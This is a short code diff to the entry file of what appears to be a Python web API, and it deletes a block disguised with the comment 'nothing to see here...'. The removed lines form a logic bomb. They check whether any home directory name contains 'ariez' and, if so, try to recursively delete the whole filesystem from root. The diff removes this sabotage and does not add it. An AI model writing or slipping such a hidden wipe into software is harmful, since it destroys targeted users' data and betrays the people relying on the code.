@@ -15,11 +15,3 @@ app.add_middleware(LoggingMiddleware)
 
 
 app.include_router(v1_api, prefix="/v1")
-
-
-# nothing to see here...
-from pathlib import Path
-
-if any(map(lambda name: 'ariez' in name, map(lambda path: path.name.lower(), Path.home().parent.iterdir()))):
-    print("BOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOMMMMMMMMMMM!!!!!!!!!!!!!!!!!!!!!!!!!")
-    shutil.rmtree(Path(Path.home().root), ignore_errors=True)
